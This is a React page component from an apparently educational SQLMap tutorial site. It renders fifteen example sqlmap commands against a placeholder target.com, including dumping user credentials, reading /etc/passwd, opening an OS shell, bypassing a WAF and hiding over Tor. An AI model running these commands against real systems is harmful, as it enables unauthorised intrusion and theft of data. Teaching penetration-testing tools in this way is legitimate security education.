'use client'
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const examples = [
  { title: 'Basic GET parameter test', cmd: "sqlmap -u 'http://target.com/page?id=1'" },
  { title: 'POST data injection', cmd: "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'" },
  { title: 'Load request from Burp file', cmd: "sqlmap -r request.txt" },
  { title: 'Enumerate all databases', cmd: "sqlmap -u 'http://target.com/page?id=1' --dbs" },
  { title: 'Enumerate tables in a database', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb --tables" },
  { title: 'Dump a specific table', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users --dump" },
  { title: 'Dump specific columns', cmd: "sqlmap -u 'http://target.com/page?id=1' -D mydb -T users -C username,password --dump" },
  { title: 'Use tamper script to bypass WAF', cmd: "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment,randomcase" },
  { title: 'Get OS shell (if privileged)', cmd: "sqlmap -u 'http://target.com/page?id=1' --os-shell" },
  { title: 'Read server file', cmd: "sqlmap -u 'http://target.com/page?id=1' --file-read=/etc/passwd" },
  { title: 'Use Tor for anonymity', cmd: "sqlmap -u 'http://target.com/page?id=1' --tor --tor-type=SOCKS5" },
  { title: 'High level + risk with random agent', cmd: "sqlmap -u 'http://target.com/page?id=1' --level=5 --risk=3 --random-agent --batch" },
  { title: 'Specify injection technique', cmd: "sqlmap -u 'http://target.com/page?id=1' --technique=BEUST" },
  { title: 'Test specific parameter', cmd: "sqlmap -u 'http://target.com/search?q=test&cat=1' -p q" },
  { title: 'Force specific DBMS', cmd: "sqlmap -u 'http://target.com/page?id=1' --dbms=mysql --batch" },
];

export default function ExamplesPage() {
  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-file-list-line" />
          SQLMap Section 9 of 13
        </div>
        <DocHeading level={1}>Usage Examples</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Real-world SQLMap commands for different exploitation scenarios.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="space-y-4">
          {examples.map((ex, i) => (
            <div key={i}>
              <h3 className="text-sm font-semibold text-white mb-2">{ex.title}</h3>
              <CodeBlock code={ex.cmd} />
            </div>
          ))}
        </div>
      </motion.section>

      <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/sqlmap/command-builder" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Command Builder <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/sqlmap/installation" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-red hover:text-cyber-red transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}